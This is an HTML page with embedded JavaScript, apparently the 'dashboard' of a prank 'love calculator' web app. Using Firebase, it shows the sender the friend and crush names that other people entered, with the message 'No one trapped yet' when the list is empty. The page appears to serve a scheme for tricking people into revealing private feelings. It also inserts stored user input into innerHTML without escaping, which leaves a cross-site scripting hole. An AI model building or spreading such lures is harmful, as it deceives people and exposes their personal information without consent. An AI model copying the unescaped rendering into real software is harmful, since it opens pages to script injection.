<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Dashboard</title>
<link rel="stylesheet" href="style.css">
</head>
<body class="bg center">

<div class="card">
  <h2>üòà Your Dashboard</h2>
  <ul id="list"></ul>
</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getFirestore, collection, getDocs, query, where } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyB1sYh3UGcubBmxmq70aMAURpolLBGM2_M",
  authDomain: "love-calculator-12.firebaseapp.com",
  projectId: "love-calculator-12",
  storageBucket: "love-calculator-12.firebasestorage.app",
  messagingSenderId: "707941034632",
  appId: "1:707941034632:web:7b6b5a7149b73f7e80cd3d",
  measurementId: "G-CW6SHK3C2T"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

const sid = new URLSearchParams(location.search).get("sid");
if (!sid) {
  list.innerHTML = "<li>Invalid dashboard ‚ùå</li>";
  throw new Error("Invalid sid");
}

const senderSnap = await getDocs(
  query(collection(db,"senders"), where("dashboardId","==",sid))
);

if (senderSnap.empty) {
  list.innerHTML = "<li>Dashboard not found ‚ùå</li>";
  throw new Error("No sender");
}

const receiverId = senderSnap.docs[0].data().receiverId;

const entriesSnap = await getDocs(
  query(collection(db,"entries"), where("receiverId","==",receiverId))
);

if (entriesSnap.empty) {
  list.innerHTML = "<li>No one trapped yet üòÖ</li>";
}

entriesSnap.forEach(d=>{
  list.innerHTML += `<li>${d.data().friend} ‚ù§Ô∏è ${d.data().crush}</li>`;
});
</script>

</body>
</html>